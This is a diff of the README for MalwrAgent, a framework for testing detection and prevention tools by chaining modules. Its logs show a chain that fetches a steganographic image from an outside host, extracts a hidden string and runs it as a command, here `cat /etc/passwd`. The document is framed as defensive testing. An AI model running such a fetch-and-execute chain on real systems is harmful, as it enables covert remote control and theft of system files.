@@ -12,40 +12,35 @@
 
 ### About MalwrAgent
 
-#### THIS PROJECT IS STILL IN ALPHA STATE
+#### THIS PROJECT IS IN BETA STATE
 
 Hello Agent M! Welcome to the MalwrAgency. The MalwrAgent enables you to test your current detection & prevention capabilities in just a few simple steps. The idea is to offer a framework of different modules you can connect to make up a chain. For example, egress testing can be established by connecting multiple HTTP POST and HTTP GET requests. 
 
-Threat actors tend to use more sophisticated techniques like steganography. This technique is not only applied during infiltration but also used for data exfiltration based on video or image steganography.
+Think about APT29, HAMMERTOSS. Threat actors tend to use more sophisticated techniques like steganography. This technique is not only applied during infiltration but also used for data exfiltration based on video or image steganography.
 Following log output demonstrates the download of an image that contains a hidden string. This string is then used as an input argument for the Command module. Finally, `cat /etc/passwd` is executed. 
 
-    bl4ckw0rm@einsteinium > python malwragent.py -l -c myChains/Stego.json --log 3
-    INFO:root:client: Checking f_retrieve_image with parameters {u'url': u'http://mfs-enterprise.com/agency/stego.png'}
-    INFO:root:client: Checking f_extract_text_from_image with parameters None
-    INFO:root:client: Checking f_exec_system with parameters None
+    [19:30:12] bl4ckw0rm:MalwrAgent git:(master*) $ python malwragent.py -l -c myChains/stego.json --log 3 -i 0
+    INFO:root:client:Adding function f_retrieve_image from module Web with args <{u'url': u'https://github.com/michaelschratt/MalwrAgent/raw/master/myChains/stego.png'}> done
+    INFO:root:client:Adding function f_extract_text_from_image from module Stego with args <None> done
+    INFO:root:client:Adding function f_exec_system from module Command with args <None> done
     Autopilot takes over in
        3
        2
        1
-    INFO:root:myChains/Stego: Chain CLIENT running
-    INFO:root:myChains/Stego: Running function f_retrieve_image from module Web with input <None> and args <{u'url': u'http://mfs-enterprise.com/agency/stego.png'}>
-    INFO:root:myChains/Stego: Running Transportation module malwragent.packages.modules.web.Web - Args: {'settings': {u'function': u'f_retrieve_image', 'input': None, u'args': {u'url': u'http://mfs-enterprise.com/agency/stego.png'}}}
-    INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): mfs-enterprise.com
-    INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): www.mfs-enterprise.com
-    INFO:root:myChains/Stego: Running function f_extract_text_from_image from module Stego with input <<cStringIO.StringI object at 0x10be7fad0>> and args <None>
-    INFO:root:myChains/Stego: Running Transformation module malwragent.packages.modules.stego.Stego - Args: {'settings': {u'function': u'f_extract_text_from_image', 'input': <cStringIO.StringI object at 0x10be7fad0>, u'args': None}}
-    INFO:root:myChains/Stego: Running function f_exec_system from module Command with input <cat /etc/passwd> and args <None>
-    INFO:root:myChains/Stego: Running Post module malwragent.packages.modules.command.Command - Args: {'settings': {u'function': u'f_exec_system', 'input': 'cat /etc/passwd', u'args': None}}
-    INFO:root:myChains/Stego: Chain CLIENT finished
-    ^C
-    Bye, Bye
+    INFO:root:myChains/stego:Chain CLIENT running
+    INFO:root:myChains/stego:Running Transportation module malwragent.packages.modules.web.Web - Args: {'settings': {u'function': u'f_retrieve_image', 'input': None, u'args': {u'url': u'https://github.com/michaelschratt/MalwrAgent/raw/master/myChains/stego.png'}}}
+    INFO:requests.packages.urllib3.connectionpool:Starting new HTTPS connection (1): github.com
+    INFO:requests.packages.urllib3.connectionpool:Starting new HTTPS connection (1): raw.githubusercontent.com
+    INFO:root:myChains/stego:Running Transformation module malwragent.packages.modules.stego.Stego - Args: {'settings': {u'function': u'f_extract_text_from_image', 'input': <_io.BytesIO object at 0x1082a3ad0>, u'args': None}}
+    INFO:root:myChains/stego:Running Post module malwragent.packages.modules.command.Command - Args: {'settings': {u'function': u'f_exec_system', 'input': 'cat /etc/passwd', u'args': None}}
+    INFO:root:myChains/stego:Chain CLIENT finished
 
 Just as one likes, you could use any other module to invoke an action on the previous output. And so on ... But in the end, you should have an eye at your detection & prevention products, and develop new defensive strategies. 
 
 ### Get started
 
-    bl4ckw0rm@einsteinium > python malwragent.py
-    usage: malwragent.py [-h] [-l] [-w] [-c CONFIGFILE] [-i INTERVAL]
+    [19:31:11] bl4ckw0rm:MalwrAgent git:(master) $ python malwragent.py                                       
+    usage: malwragent.py [-h] [-l] [-w] [-c CONFIGFILE] [-i INTERVAL] [-e EGRESS]
                          [--log {1,2,3,4}] [-V]
     
     optional arguments:
@@ -57,6 +52,9 @@ Just as one likes, you could use any other module to invoke an action on the pre
       -i INTERVAL, --interval INTERVAL
                             interval for periodic chain execution, default: 10
                             seconds
+      -e EGRESS, --egress EGRESS
+                            load file with URLs and build configuration for egress
+                            testing
       --log {1,2,3,4}       increase logging output verbosity
       -V, --version         show program's version number and exit
     
@@ -101,7 +99,7 @@ You can use the wizard to create a new client. A client consists of a chain of m
     f_http_post                      Transportation  Web                15
     f_retrieve_image                 Transportation  Web                16
     
-    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> 
+    #  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) CLIENT \> 10
     
     Adding function f_get_platform_uname from module Enumeration done
     
@@ -126,14 +124,9 @@ You can use the wizard to create a new client. A client consists of a chain of m
     
     See you then. Use 'malwragent.py -l -c myChains/test.json' to run your client.
 
-
 ### Future Work
 
 Please follow my repository's projects
-
-### Write your own modules
-
-TBD
 
 ### Support
 
